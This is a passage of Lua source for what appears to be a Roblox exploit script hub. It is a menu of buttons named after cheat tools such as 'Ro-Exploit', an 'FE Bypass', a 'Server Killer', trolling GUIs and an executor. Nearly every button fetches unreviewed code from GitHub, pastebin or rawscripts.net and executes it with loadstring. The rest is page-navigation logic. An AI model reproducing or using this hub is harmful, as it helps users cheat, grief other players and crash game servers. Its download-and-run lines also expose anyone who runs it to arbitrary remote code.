ocnfw50.BorderSizePixel = 2
ocnfw50.TextColor3 = Color3.new(1, 1, 1)
ocnfw50.TextScaled = true
ocnfw50.Font = Enum.Font.Roboto
ocnfw50.Text = "Wyd Form"
ocnfw50.Visible = false
ocnfw50.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/WYD%20Form.lua.txt"))()
end)

 ocnfg51 = Instance.new("TextButton")
ocnfg51.Parent = Others
ocnfg51.Name = "ocnfg51"
ocnfg51.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfg51.Position = UDim2.new(0.00996587239, 0, 0.03, 0)
ocnfg51.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg51.BorderColor3 = Color3.new(1, 0, 0)
ocnfg51.BorderSizePixel = 3
ocnfg51.TextColor3 = Color3.new(1, 1, 1)
ocnfg51.TextScaled = true
ocnfg51.Font = Enum.Font.Roboto
ocnfg51.Text = "Ro-Exploit v6"
ocnfg51.Visible = false
ocnfg51.MouseButton1Click:Connect(function()
loadstring(game:GetObjects("rbxassetid://364364477")[1].Source)()
end)

 ocnfg52 = Instance.new("TextButton")
ocnfg52.Parent = Others
ocnfg52.Name = "ocnfg52"
ocnfg52.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfg52.Position = UDim2.new(0.18, 0, 0.03, 0)
ocnfg52.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg52.BorderColor3 = Color3.new(1, 0, 0)
ocnfg52.BorderSizePixel = 3
ocnfg52.TextColor3 = Color3.new(1, 1, 1)
ocnfg52.TextScaled = true
ocnfg52.Font = Enum.Font.Roboto
ocnfg52.Text = "Ro-Exploit v5"
ocnfg52.Visible = false
ocnfg52.MouseButton1Click:Connect(function()
loadstring(game:GetObjects("rbxassetid://288646117")[1].Source)()
end)

 ocnfg53 = Instance.new("TextButton")
ocnfg53.Parent = Others
ocnfg53.Name = "ocnfg53"
ocnfg53.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfg53.Position = UDim2.new(0.35, 0, 0.03, 0)
ocnfg53.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg53.BorderColor3 = Color3.new(1, 0, 0)
ocnfg53.BorderSizePixel = 3
ocnfg53.TextColor3 = Color3.new(1, 1, 1)
ocnfg53.TextScaled = true
ocnfg53.Font = Enum.Font.Roboto
ocnfg53.Text = "T0pk3k v3"
ocnfg53.Visible = false
ocnfg53.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaGunsX/LuasLegacyScripts/main/%5BGUI%5D%20T0PK3K%20V3"))()
end)

 ocnfg54 = Instance.new("TextButton")
ocnfg54.Parent = Others
ocnfg54.Name = "ocnfg54"
ocnfg54.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfg54.Position = UDim2.new(0.52, 0, 0.03, 0)
ocnfg54.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg54.BorderColor3 = Color3.new(1, 0, 0)
ocnfg54.BorderSizePixel = 3
ocnfg54.TextColor3 = Color3.new(1, 1, 1)
ocnfg54.TextScaled = true
ocnfg54.Font = Enum.Font.Roboto
ocnfg54.Text = "T0pk3k v4"
ocnfg54.Visible = false
ocnfg54.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/t0pk3k_remake.txt"))()
end)

 ocnfg55 = Instance.new("TextButton")
ocnfg55.Parent = Others
ocnfg55.Name = "ocnfg55"
ocnfg55.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfg55.Position = UDim2.new(0.69, 0, 0.03, 0)
ocnfg55.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg55.BorderColor3 = Color3.new(1, 0, 0)
ocnfg55.BorderSizePixel = 3
ocnfg55.TextColor3 = Color3.new(1, 1, 1)
ocnfg55.TextScaled = true
ocnfg55.Font = Enum.Font.Roboto
ocnfg55.Text = "1x1x1x1 Gui"
ocnfg55.Visible = false
ocnfg55.MouseButton1Click:Connect(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/1x1x1x1_Gui.txt'))()
end)

 ocnfg56 = Instance.new("TextButton")
ocnfg56.Parent = Others
ocnfg56.Name = "ocnfg56"
ocnfg56.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
ocnfg56.Position = UDim2.new(0.86, 0, 0.03, 0)
ocnfg56.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg56.BorderColor3 = Color3.new(1, 0, 0)
ocnfg56.BorderSizePixel = 3
ocnfg56.TextColor3 = Color3.new(1, 1, 1)
ocnfg56.TextScaled = true
ocnfg56.Font = Enum.Font.Roboto
ocnfg56.Text = "Secret Service Panel"
ocnfg56.Visible = false
ocnfg56.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/MagnumIceCream/SecretServicePanel/6fefdf531e86404fb41b7812e7e84b69c7ea728f/ShakesSSP"))()
end)

 ocnfg57 = Instance.new("TextButton")
ocnfg57.Parent = Others
ocnfg57.Name = "ocnfg57"
ocnfg57.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfg57.Position = UDim2.new(0.00996587239, 0, 0.229999959, 0)
ocnfg57.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg57.BorderColor3 = Color3.new(1, 0, 0)
ocnfg57.BorderSizePixel = 3
ocnfg57.TextColor3 = Color3.new(1, 1, 1)
ocnfg57.TextScaled = true
ocnfg57.Font = Enum.Font.SourceSans
ocnfg57.Text = "Rc7"
ocnfg57.Visible = false
ocnfg57.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/Rc7%20by%20ROZXINO.txt"))()
end)

 ocnfg58 = Instance.new("TextButton")
ocnfg58.Parent = Others
ocnfg58.Name = "ocnfg58"
ocnfg58.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfg58.Position = UDim2.new(0.18, 0, 0.229999959, 0)
ocnfg58.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg58.BorderColor3 = Color3.new(1, 0, 0)
ocnfg58.BorderSizePixel = 3
ocnfg58.TextColor3 = Color3.new(1, 1, 1)
ocnfg58.TextScaled = true
ocnfg58.Font = Enum.Font.SourceSans
ocnfg58.Text = "Harked"
ocnfg58.Visible = false
ocnfg58.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/Harked%20FE%20Bypass%20Script%20for%20segway%20gamepass.lua.txt"))()
end)

 ocnfg59 = Instance.new("TextButton")
ocnfg59.Parent = Others
ocnfg59.Name = "ocnfg59"
ocnfg59.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfg59.Position = UDim2.new(0.35, 0, 0.229999959, 0)
ocnfg59.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg59.BorderColor3 = Color3.new(1, 0, 0)
ocnfg59.BorderSizePixel = 3
ocnfg59.TextColor3 = Color3.new(1, 1, 1)
ocnfg59.TextScaled = true
ocnfg59.Font = Enum.Font.Roboto
ocnfg59.Text = "Rose Hub v3.0.1"
ocnfg59.Visible = false
ocnfg59.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/%5BGUI%5D%20Rose%20Hub.txt"))()
end)

 ocnfg60 = Instance.new("TextButton")
ocnfg60.Parent = Others
ocnfg60.Name = "ocnfg60"
ocnfg60.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfg60.Position = UDim2.new(0.52, 0, 0.229999959, 0)
ocnfg60.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg60.BorderColor3 = Color3.new(1, 0, 0)
ocnfg60.BorderSizePixel = 3
ocnfg60.TextColor3 = Color3.new(1, 1, 1)
ocnfg60.TextScaled = true
ocnfg60.Font = Enum.Font.Roboto
ocnfg60.Text = "RoWrecker Gui"
ocnfg60.Visible = false
ocnfg60.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/%5BGUI%5D%20RoWrecker.txt"))()
end)

 ocnfg61 = Instance.new("TextButton")
ocnfg61.Parent = Others
ocnfg61.Name = "ocnfg61"
ocnfg61.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfg61.Position = UDim2.new(0.69, 0, 0.229999959, 0)
ocnfg61.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg61.BorderColor3 = Color3.new(1, 0, 0)
ocnfg61.BorderSizePixel = 3
ocnfg61.TextColor3 = Color3.new(1, 1, 1)
ocnfg61.TextScaled = true
ocnfg61.Font = Enum.Font.Roboto
ocnfg61.Text = "Ztrax Hub v1"
ocnfg61.Visible = false
ocnfg61.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/kqpSqRg1"))()
end)

 ocnfg62 = Instance.new("TextButton")
ocnfg62.Parent = Others
ocnfg62.Name = "ocnfg62"
ocnfg62.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
ocnfg62.Position = UDim2.new(0.86, 0, 0.229999959, 0)
ocnfg62.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg62.BorderColor3 = Color3.new(1, 0, 0)
ocnfg62.BorderSizePixel = 3
ocnfg62.TextColor3 = Color3.new(1, 1, 1)
ocnfg62.TextScaled = true
ocnfg62.Font = Enum.Font.Roboto
ocnfg62.Text = "Mrbean Admin"
ocnfg62.Visible = false
ocnfg62.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Test4267/mrbean/refs/heads/main/hh"))()
end)

 ocnfg63 = Instance.new("TextButton")
ocnfg63.Parent = Others
ocnfg63.Name = "ocnfg63"
ocnfg63.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfg63.Position = UDim2.new(0.00996587239, 0, 0.43, 0)
ocnfg63.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg63.BorderColor3 = Color3.new(1, 0, 0)
ocnfg63.BorderSizePixel = 3
ocnfg63.TextColor3 = Color3.new(1, 1, 1)
ocnfg63.TextScaled = true
ocnfg63.Font = Enum.Font.Roboto
ocnfg63.Text = "Verm Orb"
ocnfg63.Visible = false
ocnfg63.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/%5BAdmin%5D%20iOrb%20Verm.txt"))()
end)

 ocnfg64 = Instance.new("TextButton")
ocnfg64.Parent = Others
ocnfg64.Name = "ocnfg64"
ocnfg64.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfg64.Position = UDim2.new(0.18, 0, 0.43, 0)
ocnfg64.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg64.BorderColor3 = Color3.new(1, 0, 0)
ocnfg64.BorderSizePixel = 3
ocnfg64.TextColor3 = Color3.new(1, 1, 1)
ocnfg64.TextScaled = true
ocnfg64.Font = Enum.Font.Roboto
ocnfg64.Text = "Nexulis Admin"
ocnfg64.Visible = false
ocnfg64.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/%5BAdmin%5D%20Nexulis.txt"))()
end)

 ocnfg65 = Instance.new("TextButton")
ocnfg65.Parent = Others
ocnfg65.Name = "ocnfg65"
ocnfg65.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfg65.Position = UDim2.new(0.35, 0, 0.43, 0)
ocnfg65.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg65.BorderColor3 = Color3.new(1, 0, 0)
ocnfg65.BorderSizePixel = 3
ocnfg65.TextColor3 = Color3.new(1, 1, 1)
ocnfg65.TextScaled = true
ocnfg65.Font = Enum.Font.Roboto
ocnfg65.Text = "Projects loader"
ocnfg65.Visible = false
ocnfg65.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-elysian-25258"))()
end)

 ocnfg66 = Instance.new("TextButton")
ocnfg66.Parent = Others
ocnfg66.Name = "ocnfg66"
ocnfg66.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfg66.Position = UDim2.new(0.52, 0, 0.43, 0)
ocnfg66.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg66.BorderColor3 = Color3.new(1, 0, 0)
ocnfg66.BorderSizePixel = 3
ocnfg66.TextColor3 = Color3.new(1, 1, 1)
ocnfg66.TextScaled = true
ocnfg66.Font = Enum.Font.Roboto
ocnfg66.Text = "OLD Infinite Yield"
ocnfg66.Visible = false
ocnfg66.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/Admin%20Infinite.txt"))()
end)

 ocnfg67 = Instance.new("TextButton")
ocnfg67.Parent = Others
ocnfg67.Name = "ocnfg67"
ocnfg67.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfg67.Position = UDim2.new(0.69, 0, 0.43, 0)
ocnfg67.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg67.BorderColor3 = Color3.new(1, 0, 0)
ocnfg67.BorderSizePixel = 3
ocnfg67.TextColor3 = Color3.new(1, 1, 1)
ocnfg67.TextScaled = true
ocnfg67.Font = Enum.Font.Roboto
ocnfg67.Text = "Dominator Executor"
ocnfg67.Visible = false
ocnfg67.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/1de6bc36-181c-4ba3-b626-1303de1ae596.luau"))()
end)

 ocnfg68 = Instance.new("TextButton")
ocnfg68.Parent = Others
ocnfg68.Name = "ocnfg68"
ocnfg68.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
ocnfg68.Position = UDim2.new(0.86, 0, 0.43, 0)
ocnfg68.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg68.BorderColor3 = Color3.new(1, 0, 0)
ocnfg68.BorderSizePixel = 3
ocnfg68.TextColor3 = Color3.new(1, 1, 1)
ocnfg68.TextScaled = true
ocnfg68.Font = Enum.Font.Roboto
ocnfg68.Text = "Yong Sheldon Gui"
ocnfg68.Visible = false
ocnfg68.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/sGRa5mG6"))()
end)

 ocnfg69 = Instance.new("TextButton")
ocnfg69.Parent = Others
ocnfg69.Name = "ocnfg69"
ocnfg69.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfg69.Position = UDim2.new(0.00996587239, 0, 0.63, 0)
ocnfg69.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg69.BorderColor3 = Color3.new(1, 0, 0)
ocnfg69.BorderSizePixel = 3
ocnfg69.TextColor3 = Color3.new(1, 1, 1)
ocnfg69.TextScaled = true
ocnfg69.Font = Enum.Font.Roboto
ocnfg69.Text = "Project Ligma"
ocnfg69.Visible = false
ocnfg69.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/Project%20Ligma.txt"))()
end)

 ocnfg70 = Instance.new("TextButton")
ocnfg70.Parent = Others
ocnfg70.Name = "ocnfg70"
ocnfg70.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfg70.Position = UDim2.new(0.18, 0, 0.63, 0)
ocnfg70.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg70.BorderColor3 = Color3.new(1, 0, 0)
ocnfg70.BorderSizePixel = 3
ocnfg70.TextColor3 = Color3.new(1, 1, 1)
ocnfg70.TextScaled = true
ocnfg70.Font = Enum.Font.Roboto
ocnfg70.Text = "Project Shiba"
ocnfg70.Visible = false
ocnfg70.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/HrE2dKSD"))()
end)

 ocnfg71 = Instance.new("TextButton")
ocnfg71.Parent = Others
ocnfg71.Name = "ocnfg71"
ocnfg71.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfg71.Position = UDim2.new(0.35, 0, 0.63, 0)
ocnfg71.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg71.BorderColor3 = Color3.new(1, 0, 0)
ocnfg71.BorderSizePixel = 3
ocnfg71.TextColor3 = Color3.new(1, 1, 1)
ocnfg71.TextScaled = true
ocnfg71.Font = Enum.Font.Roboto
ocnfg71.Text = "Project SonicElijahMania"
ocnfg71.Visible = false
ocnfg71.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Hanif290/YoThereSkibidiSigma68/refs/heads/main/Yoshi681SkibidiBoy"))()
end)

 ocnfg72 = Instance.new("TextButton")
ocnfg72.Parent = Others
ocnfg72.Name = "ocnfg72"
ocnfg72.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfg72.Position = UDim2.new(0.52, 0, 0.63, 0)
ocnfg72.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg72.BorderColor3 = Color3.new(1, 0, 0)
ocnfg72.BorderSizePixel = 3
ocnfg72.TextColor3 = Color3.new(1, 1, 1)
ocnfg72.TextScaled = true
ocnfg72.Font = Enum.Font.Roboto
ocnfg72.Text = "Project Lua"
ocnfg72.Visible = false
ocnfg72.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Project-Lua-Inspired-by-Project-Ligma-26224"))()
end)

 ocnfg73 = Instance.new("TextButton")
ocnfg73.Parent = Others
ocnfg73.Name = "ocnfg73"
ocnfg73.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
ocnfg73.Position = UDim2.new(0.69, 0, 0.63, 0)
ocnfg73.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg73.BorderColor3 = Color3.new(1, 0, 0)
ocnfg73.BorderSizePixel = 3
ocnfg73.TextColor3 = Color3.new(1, 1, 1)
ocnfg73.TextScaled = true
ocnfg73.Font = Enum.Font.Roboto
ocnfg73.Text = "Ultimate Trolling Gui"
ocnfg73.Visible = false
ocnfg73.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Ultimate-trolling-gui-15461"))()
end)

 ocnfg74 = Instance.new("TextButton")
ocnfg74.Parent = Others
ocnfg74.Name = "ocnfg74"
ocnfg74.Size = UDim2.new(0.13000003, 0, 0.150000006, 0)
ocnfg74.Position = UDim2.new(0.86, 0, 0.63, 0)
ocnfg74.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg74.BorderColor3 = Color3.new(1, 0, 0)
ocnfg74.BorderSizePixel = 3
ocnfg74.TextColor3 = Color3.new(1, 1, 1)
ocnfg74.TextScaled = true
ocnfg74.Font = Enum.Font.Roboto
ocnfg74.Text = "FMA Gui"
ocnfg74.Visible = false
ocnfg74.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/Filter%20My%20Ass.lua.txt"))()
end)

 ocnfg75 = Instance.new("TextButton")
ocnfg75.Parent = Others
ocnfg75.Name = "ocnfg75"
ocnfg75.Size = UDim2.new(0.473003626, 0, 0.101999998, 0)
ocnfg75.Position = UDim2.new(0.519000053, 0, 0.799999893, 0)
ocnfg75.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg75.BorderColor3 = Color3.new(1, 0, 0)
ocnfg75.BorderSizePixel = 2
ocnfg75.TextColor3 = Color3.new(1, 1, 1)
ocnfg75.TextScaled = true
ocnfg75.Font = Enum.Font.Roboto
ocnfg75.Text = "NOOT NOOT"
ocnfg75.Visible = false
ocnfg75.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/%5BServer%20Killer%5D%20Noot%20Noot.txt"))()
end)

 ocnfg76 = Instance.new("TextButton")
ocnfg76.Parent = Others
ocnfg76.Name = "ocnfg76"
ocnfg76.Size = UDim2.new(0.490003586, 0, 0.101999998, 0)
ocnfg76.Position = UDim2.new(0.00999999978, 0, 0.800000012, 0)
ocnfg76.BackgroundColor3 = Color3.new(0, 0, 0)
ocnfg76.BorderColor3 = Color3.new(1, 0, 0)
ocnfg76.BorderSizePixel = 2
ocnfg76.TextColor3 = Color3.new(1, 1, 1)
ocnfg76.TextScaled = true
ocnfg76.Font = Enum.Font.Roboto
ocnfg76.Text = "k00pgui"
ocnfg76.Visible = false
ocnfg76.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Jkrouz1/Fd/refs/heads/main/K00pgui_delta_remake.txt"))()
end)


nextmn.MouseButton1Click:Connect(function()
for i = 1, 30 do
   buttonName = "sc" .. i
   button = sc:FindFirstChild(buttonName)

  if button and button:IsA("TextButton") then
    button.Visible = false
  end
end

for i = 1, 24 do
   buttonName = "scg" .. i
   button = sc:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") then
    button.Visible = true
  end
end

    npg.Visible = false
    npg2.Visible = false
    univ.Text = "Game Scripts"
    nextmn2.Visible = true
    nextmn.Visible = false
    ngpg.Visible = true
end)

nextmn2.MouseButton1Click:Connect(function()
for i = 1, 24 do
   buttonName = "sc" .. i
   button = sc:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") then
    button.Visible = true
  end
end

for i = 1, 24 do
   buttonName = "scg" .. i
   button = sc:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") then
    button.Visible = false
  end
end

    npg.Visible = true
    univ.Text = "Universal Scripts"
    nextmn2.Visible = false
    nextmn.Visible = true
    ngpg.Visible = false
end)

destruct.MouseButton1Click:Connect(function()
for i = 1, 24 do
   buttonName = "oc" .. i
   button = Others:FindFirstChild(buttonName)
  if button and button:IsA("TextButton") or button:IsA("TextBox") then
    button.Visible = false
  end
end

for i = 1, 24 do
   buttonName = "ocnf" .. i
   button = Others:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") then
    button.Visible = true
  end
end

    nextmy.Visible = false
    nem.Visible = true
    mysc.Text = "Client Sided Scripts"
    destruct2.Visible = true
    destruct.Visible = false
    kb.Visible = false
    kb2.Visible = false
end)

destruct2.MouseButton1Click:Connect(function()
for i = 1, 24 do
   buttonName = "oc" .. i
   button = Others:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") or button:IsA("TextBox") then
    button.Visible = true
  end
end

for i = 1, 24 do
   buttonName = "ocnf" .. i
   button = Others:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") then
    button.Visible = false
  end
end

    nextmy.Visible = true
    nem.Visible = false
    mysc.Text = "Other Scripts"
    destruct2.Visible = false
    destruct.Visible = true
    kb.Visible = true
    kb2.Visible = true
end)

npg.MouseButton1Click:Connect(function()
for i = 1, 24 do
   buttonName = "sc" .. i
   button = sc:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") then
    button.Visible = false
  end
end

for i = 25, 50 do
   buttonName = "scn" .. i
   button = sc:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") then
    button.Visible = true
  end
end

    bpg.Visible = true
    npg.Visible = false
    npg2.Visible = true
    mpages.Text = "Page 2"
    scsPage.Visible = false
end)

bpg.MouseButton1Click:Connect(function()
for i = 1, 24 do
   buttonName = "sc" .. i
   button = sc:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") then
    button.Visible = true
  end
end

for i = 25, 50 do
   buttonName = "scn" .. i
   button = sc:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") then
    button.Visible = false
  end
end

    bpg.Visible = false
    npg.Visible = true
    npg2.Visible = false
    bpg2.Visible = false
    mpages.Text = "Page 1"
    scsPage.Visible = true
end)

npg2.MouseButton1Click:Connect(function()
for i = 25, 50 do
   buttonName = "scn" .. i
   button = sc:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") then
    button.Visible = false
  end
end

for i = 50, 100 do
   buttonName = "scne" .. i
   button = sc:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") then
    button.Visible = true
  end
end

    bpg2.Visible = true
    npg2.Visible = false
    bpg.Visible = false
    mpages.Text = "Page 3"
    scsPage.Visible = false
end)

bpg2.MouseButton1Click:Connect(function()
for i = 25, 50 do
   buttonName = "scn" .. i
   button = sc:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") then
    button.Visible = true
  end
end

for i = 50, 100 do
   buttonName = "scne" .. i
   button = sc:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") then
    button.Visible = false
  end
end

    bpg2.Visible = false
    npg2.Visible = true
    bpg.Visible = true
    mpages.Text = "Page 2"
    scsPage.Visible = false
end)

ngpg.MouseButton1Click:Connect(function()
for i = 1, 24 do
   buttonName = "scg" .. i
   button = sc:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") then
    button.Visible = false
  end
end

for i = 25, 50 do
   buttonName = "scgn" .. i
   button = sc:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") then
    button.Visible = true
  end
end

    bgpg.Visible = true
    ngpg.Visible = false
    ngpg2.Visible = true
    bgpg2.Visible = false
    mpages.Text = "Page 2"
    scsPage.Visible = false
end)

bgpg.MouseButton1Click:Connect(function()
for i = 1, 24 do
   buttonName = "scg" .. i
   button = sc:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") then
    button.Visible = true
  end
end

for i = 25, 50 do
   buttonName = "scgn" .. i
   button = sc:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") then
    button.Visible = false
  end
end

    bgpg.Visible = false
    ngpg.Visible = true
    ngpg2.Visible = false
    bgpg2.Visible = false
    mpages.Text = "Page 1"
    scsPage.Visible = true
end)

ngpg2.MouseButton1Click:Connect(function()
for i = 25, 50 do
   buttonName = "scgn" .. i
   button = sc:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") then
    button.Visible = false
  end
end

for i = 50, 100 do
   buttonName = "scgne" .. i
   button = sc:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") then
    button.Visible = true
  end
end

    bgpg2.Visible = true
    ngpg2.Visible = false
    bgpg.Visible = false
    ngpg.Visible = false
    mpages.Text = "Page 3"
end)

bgpg2.MouseButton1Click:Connect(function()
for i = 25, 50 do
   buttonName = "scgn" .. i
   button = sc:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") then
    button.Visible = true
  end
end

for i = 50, 100 do
   buttonName = "scgne" .. i
   button = sc:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") then
    button.Visible = false
  end
end

    bgpg2.Visible = false
    ngpg2.Visible = true
    bgpg.Visible = true
    ngpg.Visible = false
    mpages.Text = "Page 2"
    kb.Visible = true
    kb2.Visible = true
end)

nextmy.MouseButton1Click:Connect(function()
for i = 1, 24 do
   buttonName = "oc" .. i
   button = Others:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") or button:IsA("TextBox") then
    button.Visible = false
  end
end

for i = 25, 50 do
   buttonName = "ocn" .. i
   button = Others:FindFirstChild(buttonName) 
  if button and (button:IsA("TextButton") or button:IsA("TextBox")) then
    button.Visible = true
  end
end

    backmy.Visible = true
    nextmy.Visible = false
    mypages.Text = "Page 2"
    oppage.Visible = false
    kb.Visible = false
    kb2.Visible = false
end)

backmy.MouseButton1Click:Connect(function()
for i = 1, 24 do
   buttonName = "oc" .. i
   button = Others:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") or button:IsA("TextBox") then
    button.Visible = true
  end
end

for i = 25, 50 do
   buttonName = "ocn" .. i
   button = Others:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") or button:IsA("TextBox") then
    button.Visible = false
  end
end

    backmy.Visible = false
    nextmy.Visible = true
    mypages.Text = "Page 1"
    oppage.Visible = true
    kb.Visible = true
    kb2.Visible = true

end)

nem.MouseButton1Click:Connect(function()
for i = 1, 24 do
   buttonName = "ocnf" .. i
   button = Others:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") or button:IsA("TextBox") then
    button.Visible = false
  end
end

for i = 25, 50 do
   buttonName = "ocnfw" .. i
   button = Others:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") then
    button.Visible = true
  end
end

    bem.Visible = true
    nem.Visible = false
    bem2.Visible = false
    nem2.Visible = true
    mypages.Text = "Page 2"
    oppage.Visible = false
    kb.Visible = false
    kb2.Visible = false
end)

bem.MouseButton1Click:Connect(function()
for i = 1, 24 do
   buttonName = "ocnf" .. i
   button = Others:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") or button:IsA("TextBox") then
    button.Visible = true
  end
end

for i = 25, 50 do
   buttonName = "ocnfw" .. i
   button = Others:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") then
    button.Visible = false
  end
end

    bem.Visible = false
    nem.Visible = true
    bem2.Visible = false
    nem2.Visible = false
    mypages.Text = "Page 1"
    oppage.Visible = true
end)

nem2.MouseButton1Click:Connect(function()
for i = 51, 76 do
   buttonName = "ocnfg" .. i
   button = Others:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") or button:IsA("TextBox") then
    button.Visible = true
  end
end

for i = 25, 50 do
   buttonName = "ocnfw" .. i
   button = Others:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") then
    button.Visible = false
  end
end

    bem.Visible = false
    nem.Visible = false
    bem2.Visible = true
    nem2.Visible = false
    mypages.Text = "Page 3"
    oppage.Visible = false
end)

bem2.MouseButton1Click:Connect(function()
for i = 25, 50 do
   buttonName = "ocnfw" .. i
   button = Others:FindFirstChild(buttonName) 
  if button and button:IsA("TextButton") or button:IsA("TextBox") then
    button.Visible = true
  end
end

for i = 51, 76 do
   buttonName = "ocnfg" .. i
   button = Others:FindFirstChild(buttonName) 
